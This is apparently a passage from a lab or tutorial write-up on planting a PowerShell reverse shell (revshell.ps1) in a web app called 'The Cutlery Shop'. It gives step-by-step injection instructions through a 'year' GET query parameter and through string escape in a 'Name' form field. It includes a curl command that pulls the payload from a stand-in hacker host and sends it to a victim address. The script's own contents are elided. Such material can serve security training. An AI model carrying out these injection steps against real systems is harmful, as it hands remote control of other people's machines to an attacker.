...
ipconfig
```
Open [revshell.ps1](./revshell.ps1) and modify it according to the IPv4 address of your hacker machine.
```
# revshell.ps1
...
### Method 1 - Copy Paste
Copy the contents of the [revshell.ps1](./revshell.ps1) file.
```
type payload/revshell.ps1 | clip
```
And paste the contents of [revshell.ps1](revshell.ps1) into the `year` HTTP GET Query
```
...
```
curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/revshell.ps1)" http://<victim-ip>:3000
```

## 1.4 Injecting payload into "The Cutlery Shop" web app
Using the form fields of the application, you can perform a string escape on the `Name` field, and inject the contents of [revshell.ps1](./revshell.ps1) there.
